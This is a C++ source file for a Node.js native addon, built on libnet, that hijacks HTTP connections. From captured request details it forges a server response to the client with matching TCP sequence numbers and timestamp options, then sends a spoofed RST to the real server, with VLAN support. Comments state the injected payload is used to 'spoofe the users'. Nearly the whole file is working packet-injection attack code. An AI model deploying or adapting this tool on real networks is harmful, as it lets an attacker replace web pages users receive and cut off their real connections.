/**
 *
 *  Copyright (C) 2014, DGL
 *
 *  this programe we build a http packet and send it to user.
 *
 *  the running env meght be in 802.1 vlan or not vlan.
 *
 *  if the env is vlan, open the link handle and  we send the packets in vlan.
 *
 *  if the env is not vlan, we open the raw handle and send the packets in ip interface level.
 *
 * */


#include <node.h>
#include <node_buffer.h>
#include <sys/types.h>

#include <pcap.h>
#include <pcap/pcap.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <libnet.h>
#include <sys/time.h>

#define SPOOFER_RET_STATUS_INT int
#define SPOOFER_RET_VALUE_INT int

#define SPOOFER_OK 0
#define SPOOFER_FALSE 1
#define SPOOFER_TURE 1
#define SPOOFER_FAILURE -1

#define SPOOFER_IP_OFFSET   (LIBNET_ETH_H)
#define SPOOFER_TCP_OFFSET  (LIBNET_ETH_H + LIBNET_IPV4_H)
#define SPOOFER_UDP_OFFSET  (LIBNET_ETH_H + LIBNET_IPV4_H)
#define SPOOFER_DNS_OFFSET  (LIBNET_ETH_H + LIBNET_IPV4_H + LIBNET_UDP_H)

#define SPOOFER_ETH_TYPE_IP 0       /* is ip, and no vlan */
#define SPOOFER_ETH_TYPE_VLAN   1  /* is ip and have vlan */

#define SPOOFER_NO_SUM_CHECK 0   /* no ip sum check, libnet create for us */
#define SPOOFER_IP_TTL  71      /* this ttl just for test */
#define SPOOFER_IP_TOL  0       /* ip tol */
#define SPOOFER_VOID_PALYLOAD_SIZE  0   /* is the palyload is NULL, the size is 0 */
#define SPOOFER_NEW_PACKET_TARGE  0   /* when we create a new packet we use this targe. */
#define SPOOFER_NO_WIN_SIZE     0

#define SPOOFER_TCP_WIN_SIZE  192   /* this is the tcp win size just for test */
#define SPOOFER_NO_TCP_URG  0   /* no tcp usg */
#define SPOOFER_RST_NO_ACK  0x00

#define SPOOFER_VLAN_PROT_MASK  0xe000  /* the mask for vlan prot, 3 bit */
#define SPOOFER_VLAN_CFI_MASK   0x1000  /* the mask for vlan cfi, 1 bit */
#define SPOOFER_VLAN_ID_MASK    0x0fff  /* the mask for vlan id, 12 bit */

#define SPOOFER_MAX_DEV_LEN     40
#define SPOOFER_VLAN_TARGE        1  /* if we not running not vlan */

using namespace v8;

/* gaobal var for handle */
libnet_t *handle_link = NULL;
libnet_t *handle_raw = NULL;

/* the spare tire for handle */
libnet_t *handle_link_temp;
libnet_t *handle_raw_temp;

char *dev_send_t = NULL;


/**
 *  when we catch a http get request packet, we record the request's info.
 *
 *  we use these info to build the response packet, and send it to client.
 *
 **/

typedef struct spo_http_hijack_info_s {
    u_char src_mac[6];                  /* 6 bytes mac src address */
    u_char dst_mac[6];                  /* 6 bytes mac dst address */

    u_short tcp_src_port;               /* tcp's src port  */
    u_short tcp_dst_port;               /* tcp's dst port  */

    u_long ip_src_addr;                 /* ip's src address */
    u_long ip_dst_addr;                 /* ip's dst address */

    /**
     *  tcp_next_seq = ip->total_len - tcp->head_len - ip->head_len
     *  so we can compute it by follow :
     *  int len = (u_int)ntohs(ip->ip_len) - ((u_int)(tcp->tcp_offx2 >> 2) + LIBNET_IPV4_H)
     **/
    u_int tcp_next_seq;                 /* is the tcp ack seq for response, we have to compute it */
    u_int tcp_seq_rela;                 /* tcp packet's seq, it is relative */

    u_int tcp_resp_seq;                 /* tcp response's seq, we compute and save it here */
    u_int tcp_resp_Ack;                 /* tcp response's Ack, we compute and save it here  */

    int tcp_op_len;                     /* if this tcp packet has option, we save it len */
    uint8_t tcp_op[40];                 /* tcp option the largest is 40 byte */

    uint8_t tcp_resp_flg;               /* tcp's flage, we save it, and used in response packet */

    u_short ip_off;                     /* ip offset */

    u_int tcp_rst_resp_seq;             /* when we send rst response packet, we have to compute the rst resp seq */

    /**
     *  at rst packet we can find the formula for rst_resp_Ack.
     *  hjk_info->tcp_resp_Ack = hjk_info->tcp_next_seq + hjk_info->tcp_seq_rela;
     **/
    u_int tcp_rst_resp_Ack;             /* when we send rst response packet, we have to compute the rst resp Ack */
    u_short vlan_id;                    /* the vlan id, the id is 12 bit, the prot is 3 bit, the cfi is 1 bit */
    char vlan_targe;                   /* running in vlan is 1, raw be 0 */
}spo_http_hijack_info_t, spo_http_hjk_info_t;


typedef struct spo_http_hijack_s {
    u_char src_mac[6];                  /* 6 bytes mac src address */
    u_char dst_mac[6];                  /* 6 bytes mac dst address */

    u_short vlan_id;

    u_short tcp_src_port;               /* tcp's src port  */
    u_short tcp_dst_port;               /* tcp's dst port  */

    u_long ip_src_addr;                 /* ip's src address */
    u_long ip_dst_addr;                 /* ip's dst address */
    u_short ip_len;                     /* ip's total len */
    u_short ip_off;                     /* ip offset */

    /**
     *  tcp_next_seq = ip->total_len - tcp->head_len - ip->head_len
     *  so we can compute it by follow :
     *  int len = (u_int)ntohs(ip->ip_len) - ((u_int)(tcp->tcp_offx2 >> 2) + LIBNET_IPV4_H)
     **/

    u_int tcp_seq_rela;                 /* tcp packet's seq, it is relative */
    u_int tcp_ack_rela;                 /* tcp packet's ack, it is relative */
    u_char tcp_header_len;            /* tcp packet's header length */
    uint8_t tcp_resp_flg;               /* tcp's flage, we save it, and used in response packet */

    int tcp_op_len;                     /* if this tcp packet has option, we save it len */
    uint8_t tcp_op[40];                 /* tcp option the largest is 40 byte */
    char vlan_targe;                    /* running in vlan ? */
}spo_http_hjk_t;


/**
 *  here we send the rst packet in vlan env.
 *
 *  the rst packet discontinue the connection between server and client.
 *
 *  @param hjk_info, record the http packet's info.
 *
 *  @param handle, the handle where we send the packet.
 *
 * */

SPOOFER_RET_VALUE_INT spo_do_send_http_rst_packet_to_serv(spo_http_hjk_info_t *hjk_info, libnet_t *handle) {

    if (hjk_info == NULL || handle == NULL) {
        return SPOOFER_FAILURE;
    }

    libnet_ptag_t t;

    t = libnet_build_tcp(
                hjk_info->tcp_src_port,         /* tcp src port */
                hjk_info->tcp_dst_port,         /* tcp dst port */
                hjk_info->tcp_rst_resp_seq,     /* tcp seq */
                SPOOFER_RST_NO_ACK,             /* tcp Ack */
                TH_RST,
                SPOOFER_NO_WIN_SIZE,            /* win size */
                SPOOFER_NO_SUM_CHECK,           /* tcp sum check */
                SPOOFER_NO_TCP_URG,             /* tcp urg */
                LIBNET_TCP_H,                   /* tcp header length */
                NULL,                           /* tcp palyload */
                SPOOFER_VOID_PALYLOAD_SIZE,     /* palload size */
                handle,
                SPOOFER_NEW_PACKET_TARGE
                );

    if (t == SPOOFER_FAILURE) {
        printf("built tcp packet err\n");
        return SPOOFER_FAILURE;
    }

    t = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_TCP_H,   /* ip length, is the palyload size and the header length */
                SPOOFER_IP_TOL,                 /* ip tol */
                242,                            /* ip id */
                hjk_info->ip_off,
                SPOOFER_IP_TTL,                 /* ip ttl */
                IPPROTO_TCP,                    /* tcp prot */
                SPOOFER_NO_SUM_CHECK,           /* ip check sum */
                hjk_info->ip_src_addr,          /* ip src address */
                hjk_info->ip_dst_addr,          /* ip dst address */
                NULL,                           /* ip palyload */
                SPOOFER_VOID_PALYLOAD_SIZE,     /* ip palyload size */
                handle,
                SPOOFER_NEW_PACKET_TARGE
                );

    if (t == SPOOFER_FAILURE) {
        printf("build ip v4 err\n");
        return SPOOFER_FAILURE;
    }

    if (hjk_info->vlan_targe == SPOOFER_VLAN_TARGE) {      /*  running in vlan */

        t = libnet_build_802_1q(
                    hjk_info->dst_mac,                              /* dest mac */
                    hjk_info->src_mac,                              /* source mac */
                    ETHERTYPE_VLAN,                                 /* TPI */
                    hjk_info->vlan_id & SPOOFER_VLAN_PROT_MASK,     /* priority (0 - 7) */
                    hjk_info->vlan_id & SPOOFER_VLAN_CFI_MASK,                  /* CFI flag */
                    hjk_info->vlan_id & SPOOFER_VLAN_ID_MASK,       /* vid (0 - 4095) */
                    ETHERTYPE_IP,                                   /* for ip */
                    NULL,                                           /* payload */
                    SPOOFER_VOID_PALYLOAD_SIZE,                     /* payload size */
                    handle,                                         /* libnet handle */
                    SPOOFER_NEW_PACKET_TARGE
                    );

        if (t == SPOOFER_FAILURE) {
            printf("802.1 err\n");
            return SPOOFER_FAILURE;
        }
    }

    int ret = libnet_write(handle);
    libnet_clear_packet(handle);
    if (ret == SPOOFER_FAILURE) {
        //printf("write err\n");
        return SPOOFER_FAILURE;
    }

    //printf("send rst %d\n", ret);
    return SPOOFER_OK;
}

/**
 *  here we send the http response packet to user in vlan env.
 *
 *  @param hjk_info, record the http packet's info.
 *
 *  @param handle, the handle we send the packet.
 *
 *  @param playload, the http packet content, we use it to spoofe the users.
 *
 *  @param playload_size, the http packet content size.
 *
 * */

SPOOFER_RET_STATUS_INT spo_do_send_http_response_packet(spo_http_hjk_info_t *hjk_info, libnet_t *handle, u_char  *playload, int playload_size) {

    if (hjk_info == NULL || handle == NULL) {
        return SPOOFER_FAILURE;
    }

    libnet_ptag_t t;


//    u_char test[157] = {
//        0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4f, 0x4b, 0x0d,
//        0x0a, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x3a, 0x20, 0x6e, 0x67, 0x69, 0x6e, 0x78, 0x2f, 0x31,
//        0x2e, 0x37, 0x2e, 0x35, 0x0d, 0x0a, 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20, 0x57, 0x65, 0x64, 0x2c,
//        0x20, 0x30, 0x31, 0x20, 0x4f, 0x63, 0x74, 0x20, 0x32, 0x30, 0x31, 0x34, 0x20, 0x30, 0x32, 0x3a,
//        0x31, 0x31, 0x3a, 0x34, 0x34, 0x20, 0x47, 0x4d, 0x54, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65,
//        0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74,
//        0x6d, 0x6c, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x4c, 0x65, 0x6e, 0x67,
//        0x74, 0x68, 0x3a, 0x20, 0x31, 0x31, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69,
//        0x6f, 0x6e, 0x3a, 0x20, 0x6b, 0x65, 0x65, 0x70, 0x2d, 0x61, 0x6c, 0x69, 0x76, 0x65, 0x0d, 0x0a,
//        0x0d, 0x0a, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64
//        };

    //playload = test;
    //playload_size = 157;


    /* if have the tcp options, we copy it */
    if (hjk_info->tcp_op_len > 0) {

        uint8_t temp[hjk_info->tcp_op_len];

        if (*(hjk_info->tcp_op + 2) == 0x08) {  /* the option info is timestamp */
            memcpy(temp, hjk_info->tcp_op, hjk_info->tcp_op_len);
            memcpy((temp + 4), (hjk_info->tcp_op + 8), 4);
            memcpy((temp + 8), (hjk_info->tcp_op + 4), 4);
            temp[7] = temp[7] + 1;

            t = libnet_build_tcp_options(
                        (uint8_t *)temp,        /* option palyload */
                        hjk_info->tcp_op_len, /* op len */
                        handle,
                        SPOOFER_NEW_PACKET_TARGE
                        );

            if (t == SPOOFER_FAILURE) {
                printf("send option err\n");
                return SPOOFER_FAILURE;
            }
        }else{
            hjk_info->tcp_op_len = 0;
        }
    }

    t = libnet_build_tcp(
                hjk_info->tcp_dst_port,                                 /* tcp src port */
                hjk_info->tcp_src_port,                                 /* tcp dst port */
                hjk_info->tcp_resp_seq,                                 /* tcp seq */
                hjk_info->tcp_resp_Ack,                                 /* tcp ACK */
                hjk_info->tcp_resp_flg | TH_FIN,                        /* tcp flags */
                SPOOFER_TCP_WIN_SIZE,                                   /* win size */
                SPOOFER_NO_SUM_CHECK,                                   /* check sum */
                SPOOFER_NO_TCP_URG,                                     /* tcp ueg targe */
                LIBNET_TCP_H + playload_size + hjk_info->tcp_op_len,    /* tcp total size */
                (uint8_t *)playload,                                    /* tcp palyload */
                playload_size,                                          /* tcp palyload size, is the http packets size */
                handle,
                SPOOFER_NEW_PACKET_TARGE
                );

    if (t == SPOOFER_FAILURE) {
        printf("built tcp packet err\n");
        return SPOOFER_FAILURE;
    }

    t = libnet_build_ipv4(
                LIBNET_IPV4_H + LIBNET_TCP_H + playload_size + hjk_info->tcp_op_len,    /* ip total size */
                SPOOFER_IP_TOL,                                                                         /* ip tol */
                244,                                                                                                /* ip id */
                hjk_info->ip_off,                                                                           /* ip don't fragment */
                SPOOFER_IP_TTL,                                                                         /* ip ttl */
                IPPROTO_TCP,                                                                                /* the prot is ip */
                SPOOFER_NO_SUM_CHECK,                                                           /* sum check is 0, libnet will create it for us */
                hjk_info->ip_dst_addr,                                      /* ip src addr */
                hjk_info->ip_src_addr,                                      /* ip dst addr */
                NULL,                                                                   /* ip palyload */
                SPOOFER_VOID_PALYLOAD_SIZE,                 /* ip palyload size */
                handle,
                SPOOFER_NEW_PACKET_TARGE
                );

    if (t == SPOOFER_FAILURE) {
        printf("build ip v4 err\n");
        return SPOOFER_FAILURE;
    }


    if (hjk_info->vlan_targe == SPOOFER_VLAN_TARGE) {           /* running in vlan */

        t = libnet_build_802_1q(
                    hjk_info->src_mac,                                                                            /* dest mac */
                    hjk_info->dst_mac,                                                                            /* source mac */
                    ETHERTYPE_VLAN,                                                                             /* TPI */
                    hjk_info->vlan_id & SPOOFER_VLAN_PROT_MASK,                      /* priority (0 - 7) */
                    hjk_info->vlan_id & SPOOFER_VLAN_CFI_MASK,                          /* CFI flag */
                    hjk_info->vlan_id & SPOOFER_VLAN_ID_MASK,                           /* vid (0 - 4095) */
                    ETHERTYPE_IP,                                                                                   /* for ip */
                    NULL,                                                                                                    /* payload */
                    SPOOFER_VOID_PALYLOAD_SIZE,                                                    /* payload size */
                    handle,                                                                                                 /* libnet handle */
                    SPOOFER_NEW_PACKET_TARGE
                    );

        if (t == SPOOFER_FAILURE) {
            printf("802.1 err\n");
            return SPOOFER_FAILURE;
        }
    }

    int ret = libnet_write(handle);
    libnet_clear_packet(handle);
    if (ret == SPOOFER_FAILURE) {
        //printf("write err\n");
        return SPOOFER_FAILURE;
    }
   printf("ret response   %d \n", ret);
    return SPOOFER_OK;
}


/**
 *  after send dns response's packet,
 *  we have to reset the libnet spare tire here.
 *
 *  @param handle_d, is the dst handle.
 *
 *  @param handler_s, is the src handle.
 *
 *  @return nothing.
 *
 *  status finished, tested.
 */

void copy_libnet_headler_info(
        libnet_t *handle_d, libnet_t *handle_s) {

    libnet_clear_packet(handle_d);
    libnet_clear_packet(handle_s);

    handle_d->aligner = handle_s->aligner;
    handle_d->device = handle_s->device;

    handle_d->fd = handle_s->fd;

    handle_d->injection_type = handle_s->injection_type;
    handle_d->link_offset = handle_s->link_offset;
    handle_d->link_type = handle_s->link_type;

    handle_d->pblock_end  = NULL;
    handle_d->protocol_blocks = NULL;

    handle_d->total_size = 0;
    handle_d->n_pblocks = 0;

    strncpy(handle_d->label, LIBNET_LABEL_DEFAULT, LIBNET_LABEL_SIZE);
    handle_d->label[sizeof(handle_d->label)] = '\0';
}

/**
 *  workers create a libnet handle here.
 *  use it to Cover libnet spare tire.
 *
 *  @param injection_type, is the type of driver.
 *
 *  @param dev, is the dev name.
 *
 *  @param errbuf, record the exec err info.
 *
 *  @return temp, is the libnet handle.
 *
 *  status finished, tested.
 */

libnet_t *spo_create_and_init_libnet(
        int injection_type, char *dev, char *errbuf) {

    libnet_t *temp = NULL;
    temp = libnet_init(injection_type, dev, errbuf);

    if (temp == NULL ) {
        exit(EXIT_FAILURE);
    }

    return temp;
}

/**
 *  create a libnet handle's spare tire.
 *  use it to send dns response packet.
 *
 *  @param void.
 *
 *  @return temp, is the libnet spare tire.
 *
 *  status finished, tested.
 */

libnet_t *create_libnet_spare_tire() {

    libnet_t *temp = NULL;
    size_t len = sizeof(libnet_t);

    temp = (libnet_t *)malloc(len);

    if (temp == NULL) {
        exit(EXIT_FAILURE);
    }

    memset(temp, 0, len);

    return temp;
}


SPOOFER_RET_STATUS_INT spo_http_create_handle(char *dev_s) {

    char error_raw[LIBNET_ERRBUF_SIZE]; /* 出错信息 */
    char error_vlan[LIBNET_ERRBUF_SIZE]; /* 出错信息 */

    /* init handle */

    if (handle_link == NULL) {

        handle_link = spo_create_and_init_libnet(LIBNET_LINK, dev_s, error_vlan);
        if (handle_link == NULL) {
            printf("init handle_link err, exit \n");
            exit(1);
        }

        handle_link_temp = create_libnet_spare_tire();
        copy_libnet_headler_info(handle_link_temp, handle_link);
    }

    if (handle_raw == NULL) {

        handle_raw = spo_create_and_init_libnet(LIBNET_RAW4, dev_s, error_raw);

        if (handle_raw == NULL) {
            printf("init handle_raw err, exit \n");
            exit(1);
        }

        handle_raw_temp = create_libnet_spare_tire();
        copy_libnet_headler_info(handle_raw_temp, handle_raw);
    }

    return SPOOFER_OK;
}


/**
 *  here we judge the running env.
 *
 *  @param hjk_info, record the http packet info.
 *
 *  @param handle, the handle where we send the packet.
 *
 *  @param playload, the http packet content, we use it to spoofe the users.
 *
 *  @param playload_size, the http packet content size.
 *
 * */

SPOOFER_RET_STATUS_INT
spo_send_http_response_packet(spo_http_hjk_info_t *hjk_info, u_char *playload, int playload_size) {

    int ret = -1;

    if (hjk_info == NULL || playload == NULL || playload_size <= 0 ) {
        printf("send info err\n");
        return SPOOFER_FAILURE;
    }

    if (handle_link == NULL || handle_raw == NULL) {
        printf("handle is null  \n");
        return SPOOFER_FAILURE;
    }

    if (hjk_info->vlan_targe == 0) {    /* ip raw4 no vlan */

        memset(handle_raw_temp, 0, sizeof(libnet_t));
        copy_libnet_headler_info(handle_raw_temp, handle_raw);

        ret = spo_do_send_http_response_packet(hjk_info, handle_raw_temp, playload, playload_size);
        if (ret == SPOOFER_FAILURE) {
            //printf("send http response packet err \n");
            return SPOOFER_FAILURE;
        }

        memset(handle_raw_temp, 0, sizeof(libnet_t));
        copy_libnet_headler_info(handle_raw_temp, handle_raw);

        ret = spo_do_send_http_rst_packet_to_serv(hjk_info, handle_raw_temp);
        if (ret == SPOOFER_FAILURE) {
            //printf("send tcp rst packet err");
            return SPOOFER_FAILURE;
        }

    }else {   /* 802.1 vlan */

        memset(handle_link_temp, 0, sizeof(libnet_t));
        copy_libnet_headler_info(handle_link_temp, handle_link);

        ret = spo_do_send_http_response_packet(hjk_info, handle_link_temp, playload, playload_size);
        if (ret == SPOOFER_FAILURE) {
            //printf("send http response packet err \n");
            return SPOOFER_FAILURE;
        }

        memset(handle_link_temp, 0, sizeof(libnet_t));
        copy_libnet_headler_info(handle_link_temp, handle_link);

        ret = spo_do_send_http_rst_packet_to_serv(hjk_info, handle_link_temp);
        if (ret == SPOOFER_FAILURE) {
            //priintf("send tcp rst packet err");
            return SPOOFER_FAILURE;
        }

    }   //end 802.1
    //printf("500 sended\n");
    return SPOOFER_OK;
}

/**
 *  the node js interface
 *
 * */

Handle<Value> Send(const Arguments& args) {
    HandleScope scope;

    spo_http_hjk_info_t hjk_info; /* record the hijack info */
    spo_http_hjk_t *hjk;

    /* get eth level info, src and dst info */

    /* get arg objest  */
    Local<Object> arg = args[0]->ToObject();
    Local<Object> arg1 = args[1]->ToObject();

    Local<Value> http_content_v = arg1->Get(v8::String::New("content"));
    u_char* http_content_data = (u_char*) node::Buffer::Data(http_content_v->ToObject());
    int http_data_len = arg1->Get(v8::String::New("length"))->NumberValue();


    /* get the eth info */
    u_char* info_data= (u_char*) node::Buffer::Data(arg);
    hjk = (spo_http_hjk_t *) info_data;

    /*********** eth **************/
    memcpy(hjk_info.src_mac, hjk->src_mac, 6);
    memcpy(hjk_info.dst_mac, hjk->dst_mac, 6);

    if (hjk->vlan_targe == 1) {     /* running in vlan */
        hjk_info.vlan_targe = SPOOFER_VLAN_TARGE;
        hjk_info.vlan_id = ntohs(hjk->vlan_id);
        //printf("%x\n", hjk_info.vlan_id);
    }else {
        hjk_info.vlan_id = 0;
        hjk_info.vlan_targe = 0;
    }

    /************** ip ***********/
    hjk_info.ip_src_addr = hjk->ip_src_addr;
    hjk_info.ip_dst_addr = hjk->ip_dst_addr;
    hjk_info.ip_off = ntohs(hjk->ip_off);

    /************ tcp ****/

    hjk_info.tcp_src_port = ntohs(hjk->tcp_src_port);
    hjk_info.tcp_dst_port = ntohs(hjk->tcp_dst_port);

    hjk_info.tcp_next_seq = (u_int)ntohs(hjk->ip_len) - (u_int) (((int)(hjk->tcp_header_len) >> 2) + LIBNET_IPV4_H);
    //printf("next seq %d\n", );
    hjk_info.tcp_seq_rela = ntohl(hjk->tcp_seq_rela);

    hjk_info.tcp_resp_flg = hjk->tcp_resp_flg;

    hjk_info.tcp_rst_resp_seq = hjk_info.tcp_seq_rela + hjk_info.tcp_next_seq;
    hjk_info.tcp_rst_resp_Ack = hjk_info.tcp_seq_rela;

    hjk_info.tcp_resp_seq = ntohl(hjk->tcp_ack_rela);
    hjk_info.tcp_resp_Ack = hjk_info.tcp_seq_rela + 1;


    hjk_info.tcp_op_len = (((int)(hjk->tcp_header_len) >> 2) - LIBNET_TCP_H);

    if (hjk_info.tcp_op_len > 0) {
        memcpy(hjk_info.tcp_op, hjk->tcp_op, hjk_info.tcp_op_len);
    }


    /*u_char test[157] = {
        0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x20, 0x32, 0x30, 0x30, 0x20, 0x4f, 0x4b, 0x0d,
        0x0a, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x3a, 0x20, 0x6e, 0x67, 0x69, 0x6e, 0x78, 0x2f, 0x31,
        0x2e, 0x37, 0x2e, 0x35, 0x0d, 0x0a, 0x44, 0x61, 0x74, 0x65, 0x3a, 0x20, 0x57, 0x65, 0x64, 0x2c,
        0x20, 0x30, 0x31, 0x20, 0x4f, 0x63, 0x74, 0x20, 0x32, 0x30, 0x31, 0x34, 0x20, 0x30, 0x32, 0x3a,
        0x31, 0x31, 0x3a, 0x34, 0x34, 0x20, 0x47, 0x4d, 0x54, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65,
        0x6e, 0x74, 0x2d, 0x54, 0x79, 0x70, 0x65, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74,
        0x6d, 0x6c, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x74, 0x65, 0x6e, 0x74, 0x2d, 0x4c, 0x65, 0x6e, 0x67,
        0x74, 0x68, 0x3a, 0x20, 0x31, 0x31, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69,
        0x6f, 0x6e, 0x3a, 0x20, 0x6b, 0x65, 0x65, 0x70, 0x2d, 0x61, 0x6c, 0x69, 0x76, 0x65, 0x0d, 0x0a,
        0x0d, 0x0a, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64
        };*/

	//int len = 157;
//    /* go to send packet */
    spo_send_http_response_packet(&hjk_info, (u_char *)http_content_data, http_data_len);
    return scope.Close(Undefined());
}


Handle<Value> SendInit(const Arguments& args) {
    HandleScope scope;

    /* get arg objest  */
    Local<Object> arg = args[0]->ToObject();

    /* get http data ands it's length */
    Local<Value> dev_data_v = arg->Get(v8::String::New("dev"));
    u_char* dev_content = (u_char*) node::Buffer::Data(dev_data_v->ToObject());
    int dev_len = arg->Get(v8::String::New("length"))->NumberValue();

    if (dev_len > 0) {

        dev_send_t = (char *)malloc(dev_len + 1);
        if (dev_send_t == NULL) {
            printf("malloc dev string space err, exit \n");
            exit(1);
        }

    }else {
        printf("dev len is < 0, err and exit \n");
        exit(1);
    }

    memset(dev_send_t, 0, dev_len + 1);
    memcpy(dev_send_t, dev_content, dev_len);
    dev_send_t[dev_len] = '\0';
    spo_http_create_handle(dev_send_t);
    free(dev_send_t);

    return scope.Close(Undefined());
}

void Init(Handle<Object> exports) {
    exports->Set(String::NewSymbol("sendInit"),
                 FunctionTemplate::New(SendInit)->GetFunction());
    exports->Set(String::NewSymbol("send"),
                 FunctionTemplate::New(Send)->GetFunction());
}

NODE_MODULE(sender, Init)
